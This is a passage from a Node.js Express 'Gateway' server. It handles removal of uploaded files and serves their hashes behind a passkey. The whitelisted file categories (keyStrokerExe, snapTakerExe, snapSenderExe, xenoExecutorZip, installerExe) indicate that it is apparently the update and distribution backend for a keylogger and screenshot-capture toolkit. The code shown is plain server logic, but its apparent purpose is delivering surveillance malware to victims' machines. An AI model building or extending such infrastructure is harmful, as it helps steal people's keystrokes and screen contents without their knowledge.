    console.log('Unauthorized remove attempt for category:', req.params.category);
    return res.status(401).send('Unauthorized');
  }

  const category = req.params.category;
  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
    console.log(`Invalid category remove attempt: ${category}`);
    return res.status(400).send('Invalid category');
  }

  console.log(`Starting removal for user: ${req.session.user}, category: ${category}`);
  const file = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
  if (file) {
    console.log(`Removing file: ${file.filename}, category: ${category}, uploaded by: ${req.session.user}`);
    await bucket.delete(file.fileId);
    await FileMetadata.deleteOne({ category, uploadedBy: req.session.user });
  }
  res.redirect('/updater');
});

// Updated hash endpoint
app.get('/hash/:category', async (req, res) => {
  const { category } = req.params;
  const { passkey } = req.query;

  // Validate passkey
  if (passkey !== process.env.DOWNLOAD_PASSKEY) {
    console.log(`Invalid passkey attempt for hash request: category: ${category}`);
    return res.status(403).send('Forbidden');
  }

  // Validate category
  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
    console.log(`Invalid category for hash request: ${category}`);
    return res.status(400).send('Invalid category');
  }

  try {
    const fileMetadata = await FileMetadata.findOne({ category })
      .sort({ uploadDate: -1 }); // Sort by uploadDate descending
    if (!fileMetadata) {
      console.log(`File not found for hash request: category: ${category}`);
      return res.status(404).send('File not found');
    }

    res.status(200).send(fileMetadata.hash);
  } catch (err) {
    console.error(`Error in hash endpoint for category: ${category}`, err);
    res.status(500).send('Server error');
  }
});

// Server Start
app.listen(port, () => {
  console.log(`🚀 Gateway running at http://localhost:${port}`);
});
